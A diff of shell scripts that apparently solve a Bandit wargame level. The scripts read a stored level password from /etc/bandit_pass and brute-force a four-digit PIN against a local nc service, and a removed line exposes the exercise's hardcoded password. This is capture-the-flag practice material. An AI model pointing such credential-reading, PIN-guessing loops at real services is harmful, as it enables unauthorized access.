@@ -50,9 +50,10 @@ echo "End of execution!"
 rm steplogs.log
 echo "Attempt to fetch Password for bandit25" >> /tmp/tmp.5inPudak18/steplogs.log
 echo "$(date) | nc is running on port 30002:: " >> /tmp/tmp.5inPudak18/steplogs.log
+PASSWORD=$(cat /etc/bandit_pass/bandit24)
 for i in $(seq -w 0000 9999); do
         echo "trying key:: <pwd> $i" >> tee -a /tmp/tmp.5inPudak18/steplogs.log
-        key="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"
+        key="$PASSWORD $i"
         tmux send-keys -t 0 "$key" Enter
         sleep 0.2
         tmux capture-pane -p -t 0 | grep -v '^$' > /tmp/tmp.5inPudak18/reply.log
@@ -66,5 +67,32 @@ for i in $(seq -w 0000 9999); do
         fi
 done
 ======================================================================================
+
+
+# METHOD 2: (check before run)
+===============================[namedpipe.sh]==========================================
+#!/bin/bash
+rm -f steplogs.log inputpipe
+mkfifo inputpipe
+
+# cat /etc/bandit_pass/bandit24
+PASSWORD=$(cat /etc/bandit_pass/bandit24)
+
+# Run nc in background and read input from pipe
+nc localhost 30002 < inputpipe | tee steplogs.log &
+nc_pid=$!
+
+# Start feeding input
+for pin in $(seq -w 0 9999); do
+    echo "Trying PIN: $pin"
+    echo "$PASSWORD $pin" > inputpipe
+    sleep 0.5
+
+    if grep -qi "Correct!" steplogs.log; then
+        echo "✅ Success with PIN: $pin"
+        kill $nc_pid
+        break
+    fi
+done
 
 
